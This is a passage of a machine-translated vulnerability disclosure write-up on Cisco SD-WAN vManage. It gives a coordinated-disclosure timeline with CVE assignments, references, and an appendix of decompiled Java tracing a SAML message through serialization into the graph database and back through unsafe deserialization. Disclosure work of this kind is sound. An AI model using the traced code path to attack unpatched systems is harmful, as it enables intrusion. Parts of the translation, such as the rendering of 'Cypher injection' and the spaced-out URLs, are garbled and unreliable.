translated">时间表</h1><p id="ebbc" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated"><strong class="jl hp">2020年2月19日:</strong>漏洞详情发送至psirt@cisco.com<a class="ae lh" href="mailto:psirt@cisco.com" rel="noopener ugc nofollow" target="_blank"/></p><p id="7464" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp">2020年3月13日:</strong>思科PSIRT回应称，调查结果是已知问题</p><p id="1792" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp">2020年4月2日:</strong>漏洞详情发送至<a class="ae lh" href="mailto:psirt@cisco.com" rel="noopener ugc nofollow" target="_blank">psirt@cisco.com</a></p><p id="917c" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp">2020年4月10日:</strong>思科PSIRT承认调查结果，并做出如下分配:</p><p id="271a" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"/><strong class="jl hp"><em class="lb">cscvt 65026(</em>CVE-2020–3437):</strong>赛佛注射液</p><p id="6dfc" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"><em class="lb">cscvt 70892</em>(CVE-2020–3387):</strong>Java反序列化</p><p id="31ec" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"><em class="lb">cscvt 71038</em>(CVE-2020–3406):</strong>储存的XSS</p><p id="2407" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"><em class="lb">cscvt 72764</em>(CVE-2020–3381):</strong>文件上传目录遍历</p><p id="a5a1" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"><em class="lb">cscvt 72792</em>(CVE-2020–3405):</strong>XML外部实体</p><p id="62a8" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp"><em class="lb">cscvt 74757</em>(CVE-2020–3401):</strong>文件下载目录遍历</p><p id="bc91" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp">2020年4月15日:</strong>同意90天的披露</p><p id="cf97" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><strong class="jl hp">2020年7月15日:</strong>安全advisories⁸和SD-WAN软件版本19.2.3发布</p><h1 id="9d9a" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">参考</h1><p id="7433" class="pw-post-body-paragraph jj jk ho jl b jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg ha bi translated">[1]<a class="ae lh" href="https://www.synacktiv.com/posts/pentest/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html" rel="noopener ugc nofollow" target="_blank">https://www . synacktiv . com/posts/pentest/pentesting-Cisco-SD-wan-part-1-attaking-v manage . html</a></p><p id="d062" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated"><a class="ae lh" href="https://blog.scrt.ch/2014/05/09/neo4j-enter-the-graphdb/" rel="noopener ugc nofollow" target="_blank">https://blog.scrt.ch/2014/05/09/neo4j-enter-the-graphdb/</a></p><p id="8b13" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[3]<a class="ae lh" href="https://sidechannel.tempestsi.com/the-cypher-injection-saga-9698d19bed4" rel="noopener ugc nofollow" target="_blank">https://side channel . tempest si . com/the-cypher-injection-saga-9698d 19 bed 4</a></p><p id="8eb6" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[4]<a class="ae lh" href="https://neo4j.com/docs/cypher-manual/current/clauses/load-csv/" rel="noopener ugc nofollow" target="_blank">https://neo4j . com/docs/cypher-manual/current/clauses/load-CSV/</a></p><p id="84be" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[5]<a class="ae lh" href="https://honoki.net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/" rel="noopener ugc nofollow" target="_blank">https://honoki . net/2018/12/12/from-blind-xxe-to-root-level-file-read-access/</a></p><p id="70d5" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[6]<a class="ae lh" href="https://sdwan-docs.cisco.com/Product_Documentation/Software_Features/Release_18.4/Security/02Configuring_Security_Parameters/Configuring_Single_Sign-On_Using_Okta" rel="noopener ugc nofollow" target="_blank">https://SD wan-docs . Cisco . com/Product _ Documentation/Software _ Features/Release _ 18.4/Security/02 Configuring _ Security _ Parameters/Configuring _ Single _ Sign-On _ Using _ Okta</a></p><p id="6a7b" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[7]<a class="ae lh" href="https://gravitational.com/blog/how-saml-authentication-works/" rel="noopener ugc nofollow" target="_blank">https://gravity . com/blog/how-SAML-authentic ation-works/</a></p><p id="d5ad" class="pw-post-body-paragraph jj jk ho jl b jm kh jo jp jq ki js jt ju kj jw jx jy kk ka kb kc kl ke kf kg ha bi translated">[8]<a class="ae lh" href="https://tools.cisco.com/security/center/publicationListing.x?product=Cisco&amp;title=vManage&amp;last_published=2020%20Jul&amp;sort=-day_sir#~Vulnerabilities" rel="noopener ugc nofollow" target="_blank">https://tools . Cisco . com/security/center/publication listing . x？product = Cisco&amp;title = v manage&amp;last _ published = 2020% 20 jul&amp;sort =-day _ sir # ~漏洞</a></p><h1 id="d4a1" class="il im ho bd in io ip iq ir is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji bi translated">附录一</h1><h2 id="0b4b" class="kv im ho bd in lj lk ll ir lm ln lo iv ju lp lq iz jy lr ls jd kc lt lu jh lv bi translated"><strong class="ak">序列化代码追踪</strong></h2><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="17d5" class="kv im ho kr b fi kw kx l ky kz"><strong class="kr hp">com/viptela/vmanage/server/sso/saml/SAMLLoginServlet.class - doGet() ::</strong></span><span id="a2de" class="kv im ho kr b fi la kx l ky kz">public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {<br/>   ... snipped ...<br/>   <strong class="kr hp"><em class="lb">this.commence(request, response);</em></strong><br/>   ... snipped ...</span><span id="bc57" class="kv im ho kr b fi la kx l ky kz">public void commence(HttpServletRequest request, HttpServletResponse response) throws Exception {<br/>   try {<br/>      SAMLMessageContext context = this.contextProvider.getLocalAndPeerEntity(request, response);<br/>      <strong class="kr hp"><em class="lb">this.initializeSSO(context);</em></strong><br/>   ... snipped ...</span><span id="c582" class="kv im ho kr b fi la kx l ky kz">private void initializeSSO(SAMLMessageContext context)<br/>   throws MetadataProviderException, SAMLException, MessageEncodingException, IOException {<br/>   WebSSOProfileOptions options = new WebSSOProfileOptions();<br/>   log.debug("Processing SSO using WebSSO profile");<br/>   <strong class="kr hp"><em class="lb">this.webSSOprofile.sendAuthenticationRequest(context, options);</em></strong><br/>   SAMLUtil.samlLog("AuthNRequest", "SUCCESS", context);<br/>}</span><span id="dd5b" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/vmanage/server/sso/saml/websso/WebSSOProfileImp - sendAuthenticationRequest() ::</strong></span><span id="2246" class="kv im ho kr b fi la kx l ky kz">public void sendAuthenticationRequest(SAMLMessageContext context, WebSSOProfileOptions options)<br/>throws SAMLException, MetadataProviderException, MessageEncodingException, IOException {<br/>   if (!SPSSODescriptor.DEFAULT_ELEMENT_NAME.equals(context.getLocalEntityRole())) {<br/>      throw new SAMLException("WebSSO can only be initialized for local SP, but localEntityRole is: " +<br/>      context.getLocalEntityRole());<br/>   } else {<br/>      SPSSODescriptor spDescriptor = (SPSSODescriptor) context.getLocalEntityRoleMetadata();<br/>      IDPSSODescriptor idpssoDescriptor = (IDPSSODescriptor) context.getPeerEntityRoleMetadata();<br/>      ExtendedMetadata idpExtendedMetadata = context.getPeerExtendedMetadata();<br/>      if (spDescriptor != null &amp;&amp; idpssoDescriptor != null &amp;&amp; idpExtendedMetadata != null) {<br/>         SingleSignOnService ssoService = this.getSingleSignOnService(options, idpssoDescriptor, spDescriptor);<br/>         AssertionConsumerService consumerService = this.getAssertionConsumerService(options, idpssoDescriptor, spDescriptor);<br/>        <strong class="kr hp"><em class="lb"> AuthnRequest authRequest = this.getAuthnRequest(context, options, consumerService, ssoService);</em></strong><br/>         context.setCommunicationProfileId(this.getProfileIdentifier());<br/>         context.setOutboundMessage(authRequest);<br/>         context.setOutboundSAMLMessage(authRequest);<br/>         context.setPeerEntityEndpoint(ssoService);<br/>         context.setPeerEntityRoleMetadata(idpssoDescriptor);<br/>         context.setPeerExtendedMetadata(idpExtendedMetadata);<br/>         if (options.getRelayState() != null) {<br/>            context.setRelayState(context.getRelayState());<br/>         }</span><span id="572b" class="kv im ho kr b fi la kx l ky kz">boolean sign = spDescriptor.isAuthnRequestsSigned() || idpssoDescriptor.getWantAuthnRequestsSigned();<br/>       this.sendMessage(context, sign);<br/>       SAMLMessageStorage messageStorage = context.getMessageStorage();<br/>       if (messageStorage != null) {<br/>          if (DeviceCommInfoLog.isSsoSamlLogEnabled()) {<br/>             this.log.info("Storing message request: {}", authRequest.getID());<br/>          }</span><span id="38b7" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp"><em class="lb">messageStorage.storeMessage(authRequest.getID(), authRequest);</em></strong><br/>     }</span><span id="3e5e" class="kv im ho kr b fi la kx l ky kz">} else {<br/>   throw new SAMLException(<br/>    "SPSSODescriptor, IDPSSODescriptor or IDPExtendedMetadata are not present in the SAMLContext");<br/>  }<br/> }<br/>}</span><span id="704b" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/vmanage/server/sso/storage/HttpSessionStorage.class - storeMessage() ::</strong></span><span id="2ee1" class="kv im ho kr b fi la kx l ky kz">public class HttpSessionStorage implements SAMLMessageStorage {<br/>   ... snipped ...<br/>   public void storeMessage(String messageID, XMLObject message) throws IOException, SAMLException {<br/>      if (DeviceCommInfoLog.isSsoSamlLogEnabled()) {<br/>         this.log.info("Storing message {} to session {}", messageID, this.session.getId());<br/>      }</span><span id="e728" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp"><em class="lb">SAMLObject samlObject = new SAMLObject(message);<br/>      this.samlStorageDAO.storeMessage(this.session.getId(), messageID, samlObject);</em></strong><br/>      Hashtable&lt;String, SAMLObject&lt;XMLObject&gt;&gt; messages = this.getMessages();<br/>      messages.put(messageID, new SAMLObject(message));<br/>      this.updateSession(messages);<br/>   }<br/>   ... snipped ...<br/>}</span><span id="42b6" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/vmanage/server/sso/storage/SAMLStorageDAO.class – storeMessage() ::</strong></span><span id="14b0" class="kv im ho kr b fi la kx l ky kz">public void storeMessage(String sessionId, String messageId, SAMLObject samlObject) throws SAMLException, IOException {<br/>   ByteArrayOutputStream bos = new ByteArrayOutputStream();<br/>   ObjectOutputStream out = null;<br/>   try {<br/>      <strong class="kr hp"><em class="lb">out = new ObjectOutputStream(bos);<br/>      out.writeObject(samlObject);<br/>      out.close();</em></strong><br/>   ... snipped ...<br/> <strong class="kr hp"><em class="lb">  byte[] samlMessage = bos.toByteArray();</em></strong><br/>   SAMLStorage store = new SAMLStorage(sessionId, messageId, samlMessage);<br/>   HashMap storeMap = new HashMap();<br/>   storeMap.put("messageId", store.getMessageId());<br/> <strong class="kr hp"><em class="lb">  storeMap.put("samlMessage", HexConverter.convertToHexString(store.getMessage()));</em></strong><br/>   storeMap.put("sessionId", store.getSessionId());<br/>   ... snipped ...<br/>   VGraphDataStore graphDataStore = this.databaseManager.getGraphDataStore();<br/>   ... snipped ...<br/>   <strong class="kr hp"><em class="lb">graphDataStore.addVertex("class:samlStorageNode", storeMap);</em></strong><br/>   ... snipped ...</span></pre><h2 id="9217" class="kv im ho bd in lj lk ll ir lm ln lo iv ju lp lq iz jy lr ls jd kc lt lu jh lv bi translated">反序列化代码跟踪</h2><pre class="km kn ko kp fd kq kr ks kt aw ku bi"><span id="4970" class="kv im ho kr b fi kw kx l ky kz"><strong class="kr hp">com/viptela/server/sso/saml/SAMLProcessingFilter.class - doFilter() ::</strong></span><span id="e15e" class="kv im ho kr b fi la kx l ky kz"><a class="ae lh" href="http://twitter.com/WebFilter" rel="noopener ugc nofollow" target="_blank">@WebFilter</a>(filterName = "SAMLProcessingFilter", urlPatterns = {"/samlLoginResponse"})<br/>public class SAMLProcessingFilter implements Filter {<br/>   ... snipped ...<br/>   public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)<br/>   throws IOException {<br/>      HttpServletRequest request = (HttpServletRequest) servletRequest;<br/>      HttpServletResponse response = (HttpServletResponse) servletResponse;<br/>      ... snipped ...<br/>      SAMLMessageContext context = this.contextProvider.getLocalEntity(request, response);<br/>      context = this.samlProcessor.retrieveMessage(context);<br/>      ... snipped ...<br/>      SAMLAuthenticationProvider authProvider = this.tenantComponent.samlAuthenticationProvider();<br/>      authProvider.setConsumer(consumer);<br/>      authProvider.afterPropertiesSet();</span><span id="7005" class="kv im ho kr b fi la kx l ky kz">try {<br/><strong class="kr hp"><em class="lb">         Map&lt;String, Set&lt;String&gt;&gt; userRoleMap = authProvider.authenticate(context)</em></strong><br/>      ... snipped ...</span><span id="c111" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/server/sso/saml/SAMLAuthenticationProvider.class - authenticate() ::</strong></span><span id="4d8a" class="kv im ho kr b fi la kx l ky kz">public Map&lt;String, Set&lt;String&gt;&gt; authenticate(SAMLMessageContext context) throws Exception {<br/>   if (context == null) {<br/>      throw new AuthenticationException("SAML message context is not available in the authentication token");<br/>   } else {<br/>      SAMLCredential authenticationCredential = null;<br/>      HashMap userRoleMap = new HashMap();</span><span id="6a76" class="kv im ho kr b fi la kx l ky kz">try {<br/>         if (!"urn:oasis:names:tc:SAML:2.0:profiles:SSO:browser".equals(context.getCommunicationProfileId())) {<br/>     throw new SAMLException("Unsupported profile encountered in the context " + context.getCommunicationProfileId());<br/>      }</span><span id="e37e" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp"><em class="lb">authenticationCredential = this.consumer.processAuthenticationResponse(context);</em></strong></span><span id="7268" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/server/sso/saml/websso/WebSSOProfileConsumerImpl.class - processAuthenticationResponse() ::</strong></span><span id="2875" class="kv im ho kr b fi la kx l ky kz">public SAMLCredential processAuthenticationResponse(SAMLMessageContext context) throws SAMLException, SecurityException, ValidationException, DecryptionException, IOException, ClassNotFoundException {<br/>   AuthnRequest request = null;<br/>   SAMLObject message = context.getInboundSAMLMessage();<br/>   if (!(message instanceof Response)) {<br/>      throw new SAMLException("Message is not of a Response object type");<br/>   } else {<br/>      Response response = (Response) message;<br/>      ... snipped ...<br/>      } else {<br/>         HttpSessionStorage messageStorage = (HttpSessionStorage) context.getMessageStorage();<br/>         String messageID = response.getInResponseTo();<br/>         if (messageStorage != null &amp;&amp; messageID != null) {<br/><strong class="kr hp"><em class="lb">            XMLObject xmlObject = messageStorage.retrieveMessage(messageID);</em></strong></span><span id="b5e8" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/server/sso/saml/storage/HttpSessionStorage.class - retrieveMessage() ::</strong></span><span id="d5ee" class="kv im ho kr b fi la kx l ky kz">public XMLObject retrieveMessage(String messageID) throws SAMLException, IOException, ClassNotFoundException {<br/>  <strong class="kr hp"><em class="lb"> SAMLObject&lt;XMLObject&gt; o = this.samlStorageDAO.retrieveMessage(this.session.getId(), messageID);</em></strong><br/>   Hashtable&lt;String, SAMLObject&lt;XMLObject&gt;&gt; messages = this.getMessages();<br/>   if (o == null) {<br/>      this.log.info("Message {} not found in session {}", messageID, this.session.getId());<br/>      return null;<br/>   } else {<br/>      this.log.info("Message {} found in session {}, clearing", messageID, this.session.getId());<br/>      messages.clear();<br/>      this.samlStorageDAO.deleteMessage(this.session.getId(), messageID);<br/>      this.updateSession(messages);<br/>      return o.getObject();<br/>   }<br/>}</span><span id="d9dc" class="kv im ho kr b fi la kx l ky kz"><strong class="kr hp">com/viptela/server/sso/saml/storage/SAMLStorageDAO.class - retrieveMessage() ::</strong></span><span id="905a" class="kv im ho kr b fi la kx l ky kz">public SAMLObject&lt;XMLObject&gt; retrieveMessage(String sessionId, String messageId)<br/>   ... snipped ...<br/>   <strong class="kr hp"><em class="lb">byte[] samlObjectByteArray = HexConverter.convertFromHex((String) vertex.getProperty("samlMessage"));<br/>   ByteArrayInputStream samlMsgByteArrayStream = new ByteArrayInputStream(samlObjectByteArray);<br/>   ObjectInputStream samlMsgObjInputStream = new ObjectInputStream(samlMsgByteArrayStream);</em></strong><br/>   Throwable var12 = null;</span><span id="5119" class="kv im ho kr b fi la kx l ky kz">try {<br/>      <strong class="kr hp"><em class="lb">samlObject = (SAMLObject) samlMsgObjInputStream.readObject();</em></strong><br/>   } catch (Throwable var37) { <br/>   ... snipped ...</span></pre></div></div>    
</body>
</html>